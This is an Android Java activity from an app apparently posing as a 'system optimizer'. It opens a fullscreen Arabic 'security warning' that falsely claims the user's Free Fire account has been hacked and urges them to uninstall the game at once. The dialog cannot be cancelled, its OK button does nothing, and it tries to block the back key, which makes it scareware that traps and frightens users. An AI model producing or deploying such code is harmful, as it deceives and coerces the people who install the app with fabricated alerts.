package com.example.systemoptimizer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;

public class AlertDialogActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // جعل الشاشة ملئة الشاشة
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // منع الخروج من الشاشة
        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this)
                .setTitle("تحذير أمني")
                .setMessage("تم اختراق حسابك في فري فاير! بياناتك الشخصية معرضة للخطر. قم بإلغاء تثبيت اللعبة فوراً لحماية نفسك.")
                .setCancelable(false)
                .setPositiveButton("موافق", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        // لا تفعل شيئاً عند الضغط على موافق
                    }
                });

        alertDialog.show();

        // منع الضغط على زر الرجوع
        alertDialog.setOnKeyListener(new DialogInterface.OnKeyListener() {
            @Override
            public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
                return keyCode == KeyEvent.KEYCODE_BACK;
            }
        });
    }
}